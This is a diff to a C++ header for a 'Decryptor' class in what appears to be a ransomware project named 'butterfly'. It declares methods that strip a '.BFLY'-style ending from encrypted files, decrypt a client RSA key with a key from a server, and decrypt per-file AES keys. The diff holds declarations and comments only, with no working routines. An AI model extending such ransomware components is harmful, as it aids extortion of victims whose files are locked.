@@ -7,6 +7,7 @@
 #include "directoryIterator.h"
 #include "aesKeyDatabase.h"
 #include "params.h"
+#include "exceptions.h"
 
 namespace butterfly
 {
@@ -21,19 +22,22 @@ class Decryptor
 {
 
 private:
-    std::string _decryptedCPrivateRSA, _aesKeyDbFilepath;;
+    std::string _decryptedCPrivateRSA, _aesKeyDbFilepath;
+    bool _decCPrivateRSAInitialized;
+
     std::shared_ptr<rsa::RSADecryptor> _rsaDecryptorAESKey, _rsaDecryptorCPrivateRSA;
     std::unique_ptr<aes::AESDecryptor> _aesDecryptor;
     std::unique_ptr<AESKeyDatabase> _aesKeyDatabase;
 
     /**
+     * Removes the BFLY ending from each encrypted file
      *
-     * @param filepath
+     * @param filepath: path from the file
      */
     static void removeBFLYEnding(std::string &filepath);
 
     /**
-     *
+     * Removes decrypted files from system
      */
     static void removeDecryptedFiles();
 
@@ -54,7 +58,7 @@ public:
     /**
      * Destructor Decryptor
      */
-    ~Decryptor();
+    ~Decryptor() = default;
 
     /**
      *
@@ -72,11 +76,12 @@ public:
     std::string decryptCPrivateRSA(const std::string &pkeyFromServer, const std::string &encCPrivateRSAFile);
 
     /**
+     * Decrypts the AESKey/AESIV file to be able to decrypt the files
      *
-     * @param filepath
-     * @return
+     * @param filepath: path to the AESKey.bin / AESIV.bin
+     * @return Decrypted content as std::string
      */
-    std::string  decryptAESKeyPair(const std::string &filepath);
+    std::string decryptAESKeyPair(const std::string &filepath, const std::string &type);
 
     /**
      * Decrypt the file with the AES Key
@@ -84,7 +89,7 @@ public:
      * @param filepath: path to the file
      * @param aesKey: aes key for the file
      */
-    void decryptFileWithAES(const std::string &filepath, const std::string &aesKey, const std::string & aesIV);
+    void decryptFileWithAES(const std::string &filepath, const std::string &aesKey, const std::string &aesIV);
 
 };
 
